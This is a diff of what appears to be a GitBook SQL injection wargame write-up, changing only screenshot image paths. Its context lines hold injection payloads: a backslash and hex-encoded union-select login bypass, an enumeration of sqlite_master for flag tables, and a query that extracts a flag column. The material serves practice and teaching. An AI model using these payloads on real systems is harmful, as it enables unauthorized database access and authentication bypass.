@@ -764,7 +764,7 @@ payload:  id=\\\&pw= union select char(92),0x20756e696f6e2073656c656374203078363
 
 char(92) = \ , hex = union select 0x61646d696e-- -
 
-<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
 
 ## Red\_Dragon(numeric)
 
@@ -1096,7 +1096,7 @@ table:&#x20;
 
 ' UNION select tbl\_name from sqlite\_master where tbl\_name like 'flag\_%'--
 
-<figure><img src=".gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (3) (2).png" alt=""><figcaption></figcaption></figure>
 
 column:
 
@@ -1108,7 +1108,7 @@ flag
 
 ' union SELECT flag\_0876285c FROM flag\_70c81d99 -- -
 
-<figure><img src=".gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
